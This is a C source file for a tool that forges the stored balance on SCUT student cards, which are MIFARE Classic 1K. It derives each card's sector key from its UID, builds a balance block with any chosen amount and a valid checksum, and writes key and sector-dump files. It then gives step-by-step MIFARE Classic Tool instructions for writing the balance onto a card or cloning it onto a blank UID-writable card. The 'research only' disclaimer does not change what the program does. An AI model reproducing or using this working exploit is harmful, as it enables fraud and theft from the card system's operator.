#include <stdio.h>
#include <stdlib.h>
#include <getopt.h>
#include <stdint.h>
#include <stdbool.h>
#include <string.h>

int main(int argc, char* argv[]) {

    bool is_interactive = false;
    const char* output_path = NULL;
    uint32_t uid = 0x0;
    uint32_t balance = 0x0;

    static struct option long_opts[] = {
        {"help",        no_argument,        NULL, 'h'},
        {"interactive", no_argument,        NULL, 'i'},
        {"uid",         required_argument,  NULL, 'u'},
        {"balance",     required_argument,  NULL, 'b'},
        {0, 0, 0, 0}
    };

    int opt, idx;
    char* end;
    while ((opt = getopt_long(argc, argv, ":hiu:b:", long_opts, &idx)) != -1) {
        switch (opt) {
        case 'h':
            printf("Usage: %s -i\n%s --uid=A1A2A3A4 --balance=123.45\n", argv[0], argv[0]);
            return 0;
        case 'i':
            is_interactive = true;
            break;
        case 'u':
            uid = (uint32_t)strtoul(optarg, &end, 16);
            printf("uid: %08X\n", uid);
            break;
        case 'b':
            balance = (uint32_t)(100*strtof(optarg, &end));
            printf("balance: %08X(%d)\n", balance, balance);
            break;
        case ':':
            fprintf(stderr, "option '%s' needs an argument\n", argv[optind - 1]);
            return 1;
        case '?':
        default:
            fprintf(stderr, "unknown option '%s'\n", argv[optind - 1]);
            return 1;
        }
    }
    

    if (is_interactive) {    
        printf("\nThis program is only for scut student card (and only works on the MIFARE Classic 1K portion of the card).\n\
For research purpose only, DO NOT use it for illegal purposes.\n\
It is recommended to use a new uid-writable M1 card to play with.\n\
The author is not responsible for any loss, damage or legal consequences caused by the use of this program.\n");
        printf("Continue means you have read and understood the above warning, and you will not use it for illegal purposes.\n\n");
        printf("Press Enter to continue...");
        getchar();
        printf("\nThis interactive mode will guide you through generating block data and a key file for your card.\n\
You will need an Android phone with NFC support and a MIFARE Classic Tool (MCT) installed to write to your card.\n\n\
");

        printf("First, scan your card with MCT, UID should be the first 8 hex digits of block 0, sector 0.\n");
        printf("Please input your card's UID (8 hex digits, e.g. A1A2A3A4): ");
        char uid_str[9];
        scanf("%8s", uid_str);getchar();
        uid = (uint32_t)strtoul(uid_str, NULL, 16);

        printf("Then input the balance you want to set (e.g. 123.45): ");
        char balance_str[16];
        scanf("%15s", balance_str);getchar();
        balance = (uint32_t)(100 * strtof(balance_str, NULL));
        printf("uid: %08X, balance: %08X(%d)\n", uid, balance, balance);
    }
    uint8_t uid_bytes[4], balance_bytes[4];
    uint8_t bcc = 0x00, sum = 0x00;
    int i;
    for (i = 0; i < 4; i++) {
        uid_bytes[i] = (uid >> (8 * i)) & 0xFF;
        bcc = bcc ^ uid_bytes[i];
        sum = sum + uid_bytes[i];
        balance_bytes[i] = (balance >> (8 * i)) & 0xFF;
    }
    uint64_t key = ((uint64_t)uid << 16) | ((uint64_t)bcc << 8) | sum;
    printf("\nKey: %012llX\n", (unsigned long long int)key);
    uint8_t bal_block[16];
    // record type, useless actually...
    bal_block[0] = 0x01;
    bal_block[1] = 0x00;
    // balance
    bal_block[2] = balance_bytes[0];
    bal_block[3] = balance_bytes[1];
    bal_block[4] = balance_bytes[2];
    bal_block[5] = balance_bytes[3];
    // ~balance, no one cares
    bal_block[6] = ~balance_bytes[0];
    bal_block[7] = ~balance_bytes[1];
    bal_block[8] = ~balance_bytes[2];
    bal_block[9] = ~balance_bytes[3];
    // time, no one cares
    bal_block[10] = 0x00; // min
    bal_block[11] = 0x00; // hr
    bal_block[12] = 0x00; // day
    bal_block[13] = 0x00; // month
    // unknown, 0x00 on every card
    bal_block[14] = 0x00;
    // important, check sum
    bal_block[15] = 0x00;
    for(i = 0; i < 15; i++) {
        bal_block[15] = bal_block[15] + bal_block[i];
    }

    printf("Generated balance block (Block 0, Sector 14): ");
    for(i = 0; i < 16; i++) {
        printf("%02X", bal_block[i]);
    }
    printf("\n\n");

    char uid_str[9], temp[16];
    sprintf(uid_str, "%08X", uid);

    sprintf(temp, "%s%s", uid_str, ".mct");
    FILE* fp_sector = fopen(temp, "wb");
    fprintf(fp_sector, "+Sector: 1\n");
    fprintf(fp_sector, "%08X%02X2804000000000000000000\n", uid, bcc); // uid, bcc, sak(28), atqa(0400), a constant depends on the card batch
    fprintf(fp_sector, "00000000000000000000000000000000\n");
    fprintf(fp_sector, "00000000000000000000000000000000\n");
    fprintf(fp_sector, "FFFFFFFFFFFF7F078800FFFFFFFFFFFF\n");
    
    fprintf(fp_sector, "+Sector: 13\n");
    fprintf(fp_sector, "00000000000000000000000000000000\n"); // all zero
    fprintf(fp_sector, "00000000000000000000000000000000\n"); // all zero
    fprintf(fp_sector, "00000000000000000000000000000000\n"); // a constant, the same on all cards examined, unknown purpose
    fprintf(fp_sector, "%012llX7F078800%012llX\n", (unsigned long long int)key, (unsigned long long int)key);

    fprintf(fp_sector, "+Sector: 14\n");
    for(i = 0; i < 16; i++) {
        fprintf(fp_sector, "%02X", bal_block[i]);             // most recent transaction record; also holds your balance
    }
    fprintf(fp_sector, "\n00000000000000000000000000000000"); // unknown, may update when spending
    fprintf(fp_sector, "\n00000000000000000000000000000000"); // spending history, useless
    fprintf(fp_sector, "\n%012llX7F078800%012llX\n", (unsigned long long int)key, (unsigned long long int)key);
    
    fprintf(fp_sector, "+Sector: 15\n");
    fprintf(fp_sector, "00000000000000000000000000000000\n"); // backup of blk0sec14, but never actually checked
    fprintf(fp_sector, "00000000000000000000000000000000\n"); // backup of blk2sec14, also useless
    fprintf(fp_sector, "00000000000000000000000000000000\n"); // all zero
    fprintf(fp_sector, "%012llX7F078800%012llX\n", (unsigned long long int)key, (unsigned long long int)key);
    
    fclose(fp_sector);

    sprintf(temp, "%s%s", uid_str, ".key");
    FILE* fp_key = fopen(temp, "wb");
    fprintf(fp_key, "# UID: %08X\n%012llX\n", uid, (unsigned long long int)key);
    fclose(fp_key);

    if(is_interactive) {
        printf("Key file and sector file should be generated in the working directory.\n\
If you want to write to your own card directly:\n\
- Import the key file to MCT, then copy the balance block, and use \"Write Block\" to write block data to block 0, sector 14.\n\
If you want to write to a blank card:\n\
- Import the key file and the sector file to MCT, then 1.Use \"Clone UID\" 2.Use \"Write Dump (Clone)\" to clone sector 13, 14 and 15.\n");
        
    }
    
    return 0;
}
